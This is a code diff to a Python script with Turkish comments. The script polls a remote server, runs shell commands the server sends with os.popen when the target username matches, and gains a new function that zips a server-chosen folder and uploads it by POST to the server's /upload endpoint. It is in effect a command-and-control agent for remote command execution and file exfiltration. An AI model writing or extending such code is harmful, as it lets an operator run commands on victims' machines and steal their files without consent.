@@ -5,7 +5,7 @@ import time
 import shutil
 import tempfile
 import pathlib
-import zipfile
+from zipfile import ZipFile, ZIP_DEFLATED
 
 
 
@@ -95,6 +95,8 @@ def listenAndPostData():
             username = data.get("username")
             command = data.get("command")
             ziplensinMi = data.get("zip")
+            zipfile = data.get("zipfile")
+
             if ziplensinMi == "true":
                 if eskiRes != response.text or username != eskiKullanici:
                     eskiRes = response.text
@@ -103,10 +105,10 @@ def listenAndPostData():
                     if username == os.getlogin() or username == "*":
                         # Execute command and save output to a temporary file
                         dosyalar = os.popen(command).read()
-                        print("fileUpload tetiklendi, su path ile --> " + dosyalar.replace(" ",""))
+                        print("fileUpload tetiklendi, su path ile --> " + dosyalar.replace("\\", "/").strip()) 
 
                         # Upload the temporary file
-                        fileUpload(dosyalar.replace(" ",""))
+                        fileUpload(dosyalar.replace("\\", "/").strip(),zipfile)
 
                         time.sleep(3)
             else:
@@ -131,11 +133,25 @@ def listenAndPostData():
             print(e)
             time.sleep(3)
 
-def fileUpload(smth):
 
-    file_list = os.listdir(smth)
-    print(file_list)
+def fileUpload(path, ziplenecek_filenin_ismi):
+    try:
+        url = URL + "/upload"
+        print(path)
+        shutil.make_archive(path+"/"+os.getlogin() + "_" +ziplenecek_filenin_ismi + "1",'zip',path+"/" + ziplenecek_filenin_ismi)
 
+
+    # ZIP dosyasını POST et
+        with open(path + "/" +os.getlogin()+"_"+ ziplenecek_filenin_ismi + "1.zip", 'rb') as dosya:
+            files = {'file': dosya}
+            response = requests.post(url, files=files)
+    
+    except Exception as e:
+        print()
+
+
+
+ 
 
 
 
